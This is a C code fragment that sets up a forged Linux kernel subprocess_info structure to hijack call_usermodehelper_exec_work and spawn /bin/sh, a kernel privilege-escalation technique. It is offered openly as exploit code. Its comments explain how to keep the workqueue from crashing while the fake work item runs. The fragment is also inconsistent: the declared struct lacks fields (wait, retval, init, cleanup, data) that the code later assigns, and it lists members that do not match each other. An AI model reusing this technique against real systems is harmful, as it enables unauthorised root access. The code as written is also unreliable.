// Fake subprocess_info structure setup for privilege escalation

struct subprocess_info {
    struct work_struct work;       // Work structure for deferred execution
    struct completion *complete;   // Unused, can be left irrelevant
    const char *path;              // Path to the program to execute
    const char *argv[2];           // Arguments array (e.g., program and NULL)
    const char *envp[1];           // Environment variables (NULL for none)
    unsigned long flags;           // Unused, can be left irrelevant
    uid_t uid;                     // User ID for the process
    gid_t gid;                     // Group ID for the process
    uid_t euid;                    // Effective user ID
    gid_t egid;                    // Effective group ID
    unsigned long ppid;            // Parent process ID
    unsigned long gidset;          // Unused, can be left irrelevant
    unsigned long ruid;            // Real user ID
    unsigned long rgid;            // Real group ID
    // ... (other members omitted for brevity)
};

// Changes for the exploit setup:

/*
 * work.data: Set to 0, indicating no specific data.
 */
sub_info->work.data = 0;

/*
 * work.entry.next: Set to the address of itself, creating a circular linked list.
 * This is necessary for the kernel's workqueue mechanism to function without crashing.
 * The kernel uses the work_struct object to queue work items (deferred tasks).
 * When a work_struct is added to the queue, it traverses the next and prev pointers to handle multiple work items.
 * In this exploit, the attacker provides a standalone fake work_struct (not part of any real list). 
 * Setting up next and prev properly ensures the kernel doesn't crash or panic when it tries to process the fake work item.
 */
sub_info->work.entry.next = &sub_info->work.entry;

/*
 * work.entry.prev: Set to the address of work.entry.next.
 * Ensures the linked list structure is consistent for the kernel.
 */
sub_info->work.entry.prev = sub_info->work.entry.next;

/*
 * work.func: Set to call_usermodehelper_exec_work.
 * This is the key function that spawns the user-space process.
 */
sub_info->work.func = call_usermodehelper_exec_work;

/*
 * complete: Irrelevant for this exploit; leave it unchanged or NULL.
 */
sub_info->complete = NULL;

/*
 * path: Keep it the same or overwrite it with the original value.
 * Points to the executable file path (e.g., "/bin/sh").
 */
sub_info->path = original_path;

/*
 * argv: Set to the address of an array containing the arguments for the process.
 * Typically set to something like { "/bin/sh", NULL }.
 */
sub_info->argv[0] = "/bin/sh";
sub_info->argv[1] = NULL;

/*
 * envp: Set to NULL since no environment variables are needed.
 */
sub_info->envp[0] = NULL;

/*
 * flags, wait, retval: Irrelevant for this exploit; leave them unchanged or set to 0.
 */
sub_info->flags = 0;
sub_info->wait = 0;
sub_info->retval = 0;

/*
 * *init and *cleanup: Set to NULL since no initialization or cleanup is required.
 */
sub_info->init = NULL;
sub_info->cleanup = NULL;

/*
 * data: Irrelevant for this exploit; leave it unchanged.
 */
sub_info->data = NULL;

